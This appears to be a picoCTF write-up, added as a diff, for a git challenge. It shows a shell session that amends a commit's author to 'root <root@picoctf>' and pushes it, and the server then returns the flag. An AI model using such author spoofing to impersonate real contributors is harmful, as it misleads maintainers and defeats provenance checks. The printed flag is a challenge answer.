@@ -1,0 +1,58 @@
+To get the flag we just need to push a commit with a `flag.txt` file that is authored by someone with the name `root` and email `root@picoctf`.
+
+Git lets us use any email/name combination so this is pretty easy to do.
+
+```
+> ls
+README.md
+> cat README.md
+# MyGit
+
+### If you want the flag, make sure to push the flag!
+
+Only flag.txt pushed by ```root:root@picoctf``` will be updated with the flag.
+
+GOOD LUCK!
+> git log
+commit b4b49f21dcf1ce5279335dec7e173e8e7679b26f (HEAD -> master, origin/master, origin/HEAD)
+Author: git <git@picoctf>
+Date:   Fri Mar 6 20:16:50 2026 +0000
+
+    Challenge commit
+> touch flag.txt
+> ga -A
+> gcmsg "Add flag"
+[master a3b46b6] Add flag
+ 1 file changed, 0 insertions(+), 0 deletions(-)
+ create mode 100644 flag.txt
+> gst
+On branch master
+Your branch is ahead of 'origin/master' by 1 commit.
+  (use "git push" to publish your local commits)
+
+nothing to commit, working tree clean
+> git commit --amend
+[master ffa27f7] Add flag
+ Date: Mon Mar 9 23:32:05 2026 -0700
+ 1 file changed, 0 insertions(+), 0 deletions(-)
+ create mode 100644 flag.txt
+> git commit --amend --author "root <root@picoctf>" --no-edit
+[master 1d19820] Add flag
+ Author: root <root@picoctf>
+ Date: Mon Mar 9 23:32:05 2026 -0700
+ 1 file changed, 0 insertions(+), 0 deletions(-)
+ create mode 100644 flag.txt
+> git push
+git@foggy-cliff.picoctf.net's password:
+Enumerating objects: 4, done.
+Counting objects: 100% (4/4), done.
+Delta compression using up to 16 threads
+Compressing objects: 100% (2/2), done.
+Writing objects: 100% (3/3), 291 bytes | 291.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
+remote: Author matched and flag.txt found in commit...
+remote: Congratulations! You have successfully impersonated the root user
+remote: Here's your flag: picoCTF{1mp3rs0n4t4_g17_345y_02a39618}
+To ssh://foggy-cliff.picoctf.net:60177/git/challenge.git
+   b4b49f2..1d19820  master -> master
+```
